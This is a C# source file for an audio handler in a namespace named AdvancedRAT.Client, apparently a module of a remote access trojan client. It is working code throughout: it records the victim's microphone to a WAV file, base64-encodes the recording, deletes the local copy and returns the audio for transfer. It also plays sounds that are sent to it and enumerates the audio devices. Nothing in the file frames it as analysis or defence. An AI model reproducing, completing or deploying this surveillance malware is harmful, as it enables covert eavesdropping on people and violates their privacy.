using System;
using System.IO;
using System.Threading.Tasks;
using NAudio.Wave;

namespace AdvancedRAT.Client.Handlers
{
    public class AudioHandler
    {
        private WaveInEvent waveIn;
        private WaveFileWriter waveWriter;
        private WaveOutEvent waveOut;
        private string currentRecordingFile;
        private bool isRecording = false;
        
        public async Task<object> StartRecording()
        {
            try
            {
                if (isRecording)
                {
                    return new { success = false, message = "Already recording" };
                }
                
                waveIn = new WaveInEvent();
                waveIn.WaveFormat = new WaveFormat(44100, 1);
                
                currentRecordingFile = $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav";
                waveWriter = new WaveFileWriter(currentRecordingFile, waveIn.WaveFormat);
                
                waveIn.DataAvailable += (s, e) =>
                {
                    waveWriter.Write(e.Buffer, 0, e.BytesRecorded);
                };
                
                waveIn.StartRecording();
                isRecording = true;
                
                return new { success = true, message = "Recording started", filename = currentRecordingFile };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> StopRecording()
        {
            try
            {
                if (!isRecording)
                {
                    return new { success = false, message = "Not recording" };
                }
                
                waveIn?.StopRecording();
                waveWriter?.Close();
                waveIn?.Dispose();
                waveWriter?.Dispose();
                isRecording = false;
                
                byte[] audioBytes = await File.ReadAllBytesAsync(currentRecordingFile);
                string base64 = Convert.ToBase64String(audioBytes);
                
                File.Delete(currentRecordingFile);
                
                return new
                {
                    success = true,
                    message = "Recording stopped",
                    audio = base64,
                    size = audioBytes.Length
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> PlaySound(dynamic data)
        {
            try
            {
                byte[] audioBytes = Convert.FromBase64String(data.ToString());
                string tempFile = Path.GetTempFileName() + ".wav";
                await File.WriteAllBytesAsync(tempFile, audioBytes);
                
                using (var audioFile = new AudioFileReader(tempFile))
                {
                    waveOut = new WaveOutEvent();
                    waveOut.Init(audioFile);
                    waveOut.Play();
                    
                    while (waveOut.PlaybackState == PlaybackState.Playing)
                    {
                        await Task.Delay(100);
                    }
                }
                
                File.Delete(tempFile);
                
                return new { success = true, message = "Sound played" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetAudioDevices()
        {
            try
            {
                var devices = new System.Collections.Generic.List<object>();
                
                for (int i = 0; i < WaveIn.DeviceCount; i++)
                {
                    var caps = WaveIn.GetCapabilities(i);
                    devices.Add(new
                    {
                        index = i,
                        name = caps.ProductName,
                        channels = caps.Channels
                    });
                }
                
                return new { success = true, devices };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
